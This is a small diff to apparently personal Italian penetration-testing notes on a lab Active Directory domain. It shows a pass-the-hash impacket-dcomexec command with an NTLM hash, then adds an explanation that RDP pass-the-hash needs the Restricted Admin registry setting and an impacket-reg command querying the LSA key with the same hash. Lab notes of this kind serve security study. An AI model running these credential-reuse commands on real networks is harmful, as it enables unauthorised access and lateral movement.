@@ -270,4 +270,6 @@ impacket-dcomexec -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.star
 ```
 ![[Pasted image 20230907163542.png]]
 *RDP PTH*
-Normalmente per usare rdp senza password bisogna abilitare un opzione nel registro (Restricted Admin)
+Normalmente per usare rdp senza password bisogna abilitare un opzione nel registro (Restricted Admin). Si può fare da fuori con impacket
+
+impacket-reg NORTH/catelyn.stark@192.168.56.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' query -keyName 'HKLM\System\CurrentControlSet\Control\Lsa'
